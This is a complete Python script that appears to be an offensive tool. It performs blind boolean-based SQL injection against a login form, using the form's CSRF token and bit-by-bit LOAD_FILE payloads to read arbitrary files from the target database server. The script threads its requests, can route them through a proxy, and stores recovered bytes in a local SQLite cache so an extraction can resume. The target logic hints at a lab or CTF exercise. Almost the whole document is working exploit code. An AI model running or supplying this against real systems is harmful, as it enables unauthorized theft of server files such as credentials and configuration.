import sys
import argparse
import sqlite3
import threading
import queue  # Atualizado de Queue para queue
import requests
from bs4 import BeautifulSoup


class Database:
    def __init__(self):
        self.__create_table()

    def __create_connection(self):
        conn = None
        try:
            conn = sqlite3.connect("files.db")
        except:
            sys.exit(1)
        return conn

    def __create_table(self):
        conn = self.__create_connection()
        sql_create_files_table = """
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY,
            name TEXT NOT NULL,
            character VARCHAR(1) NOT NULL,
            position INTEGER NOT NULL
        );
        """
        sql_create_files_size_table = """
        CREATE TABLE IF NOT EXISTS files_size (
            id INTEGER PRIMARY KEY,
            name TEXT NOT NULL,
            size INTEGER NOT NULL
        );
        """
        try:
            c = conn.cursor()
            c.execute(sql_create_files_table)
            c.execute(sql_create_files_size_table)
            conn.commit()
            conn.close()
        except Exception as e:
            print(e)

    def insert_character(self, data):
        conn = self.__create_connection()
        sql_insert_files_table = """
        INSERT INTO files(name, character, position) VALUES(?, ?, ?);
        """
        c = conn.cursor()
        c.execute(sql_insert_files_table, data)
        conn.commit()
        conn.close()
        return c.lastrowid

    def insert_file_size(self, data):
        conn = self.__create_connection()
        sql_insert_files_size_table = """
        INSERT INTO files_size(name, size) VALUES(?, ?);
        """
        c = conn.cursor()
        c.execute(sql_insert_files_size_table, data)
        conn.commit()
        conn.close()
        return c.lastrowid

    def exists_character_by_position(self, data):
        conn = self.__create_connection()
        c = conn.cursor()
        c.execute("SELECT * FROM files WHERE name=? AND position=?", data)
        rows = c.fetchall()
        conn.close()
        return len(rows) != 0

    def get_file_size(self, data):
        conn = self.__create_connection()
        c = conn.cursor()
        c.execute("SELECT size FROM files_size WHERE name=? AND size != 0", data)
        row = c.fetchone()
        conn.close()
        size = row[0] if row else 0
        return size

    def get_downloaded_quantity(self, data):
        conn = self.__create_connection()
        c = conn.cursor()
        c.execute(
            "SELECT DISTINCT position FROM files WHERE name=? ORDER BY position DESC LIMIT 1",
            data,
        )
        row = c.fetchone()
        conn.close()
        size = row[0] if row else 0
        return size

    def print_archive(self, data):
        conn = self.__create_connection()
        c = conn.cursor()
        c.execute(
            "SELECT character FROM files WHERE name=? ORDER BY position;",
            data,
        )
        rows = c.fetchall()
        conn.close()
        return "".join(row[0] for row in rows)


class SQLInjection:
    def __init__(self, url, proxy):
        self.__session = requests.Session()
        self.url = url
        self.__token = None
        if proxy:
            self.__session.proxies = {"http": proxy}

    def __request(self, payload):
        if self.__token is None:
            r = self.__session.get(self.url)
            soup = BeautifulSoup(r.content, "html.parser")
            self.__token = soup.find("input", type="hidden")["value"]
        headers = {"Content-type": "application/x-www-form-urlencoded"}
        data = "_token={}&username={}--+-&password='--+-".format(self.__token, payload)
        return self.__session.post(self.url, headers=headers, data=data)

    def __extract_byte(self, exploit):
        byte = ""
        for bit_pos in range(7, -1, -1):
            payload = "'OR(SELECT+(({0}>>{1})%261))=1".format(exploit, bit_pos)
            r = self.__request(payload)
            if r.status_code != 200:
                raise Exception("Unexpected Status: {0}".format(r.status_code))
            soup = BeautifulSoup(r.content, "html.parser")
            bit = "1" if "autorizado" in soup.find("b").string else "0"
            byte += bit
        return byte

    def length_data(self, archive):
        try:
            length = ""
            for letter_pos in range(1, 999):
                exploit = "ASCII(SUBSTRING(CHAR_LENGTH(LOAD_FILE('{}')),{},1))".format(
                    archive, letter_pos
                )
                byte = self.__extract_byte(exploit)
                char = chr(int(byte, 2))
                if not char.isalnum():
                    break
                length += char
            return int(length)
        except:
            return 0

    def extract_character_by_position(self, archive, letter_pos):
        exploit = "ASCII(SUBSTRING((LOAD_FILE('{}')),{},1))".format(
            archive, letter_pos
        )
        byte = self.__extract_byte(exploit)
        return chr(int(byte, 2))


class WorkerThread(threading.Thread):
    def __init__(self, queue, args, tid):
        threading.Thread.__init__(self)
        self.__queue = queue
        self.__archive = args.file
        self.tid = tid
        self.__database = Database()
        self.__sqli = SQLInjection(args.url, args.proxy)

    def run(self):
        while True:
            try:
                position = self.__queue.get(timeout=1)
            except queue.Empty:
                return

            if position:
                try:
                    if not self.__database.exists_character_by_position(
                        (self.__archive, position)
                    ):
                        char = self.__sqli.extract_character_by_position(
                            self.__archive, position
                        )
                        self.__database.insert_character(
                            (self.__archive, char, position)
                        )
                except:
                    return
                self.__queue.task_done()


def create_thread(queue, args, tid):
    worker = WorkerThread(queue, args, tid)
    worker.setDaemon(True)
    worker.start()
    return worker


parser = argparse.ArgumentParser()
parser.add_argument(
    "-f", "--file", help="Read a file from the back-end DBMS file system", required=True
)
parser.add_argument(
    "-u", "--url", help='Target URL (e.g. "http://www.site.com/")'
)
parser.add_argument(
    "-t",
    "--threads",
    help="Max number of concurrent HTTP(s) requests (default 1)",
    nargs="?",
    const=1,
    type=int,
    default=1,
)
parser.add_argument("-x", "--proxy", help="Use a proxy to connect to the target URL")
args = parser.parse_args()

queue = queue.Queue()
database = Database()
length_character = database.get_file_size((args.file,))

if not args.url:
    if length_character == 0:
        print("File does not exist or has no content")
    else:
        quantity = database.get_downloaded_quantity((args.file,))
        print("File size: {} bytes".format(quantity))
        print(database.print_archive((args.file,)))
    exit(0)

if length_character == 0:
    sqli = SQLInjection(args.url, args.proxy)
    length_character = sqli.length_data(args.file)
    database.insert_file_size((args.file, length_character))
    print("File size: {} bytes".format(length_character))

if length_character > 0:
    for position in range(1, length_character + 1):
        queue.put(position)

    threads = []
    for tid in range(1, args.threads + 1):
        worker = create_thread(queue, args, tid)
        threads.append(worker)

    is_alive = True
    while not queue.empty() and is_alive:
        try:
            for tid in range(len(threads)):
                if not is_alive and not queue.empty():
                    worker = create_thread(queue, args, tid)
                    threads[tid] = worker
                is_alive = threads[tid].is_alive()
        except KeyboardInterrupt:
            sys.exit(1)

    quantity = database.get_downloaded_quantity((args.file,))
    if quantity >= (length_character - 1):
        print(database.print_archive((args.file,)))
    else:
        print("File does not exist or has no content")
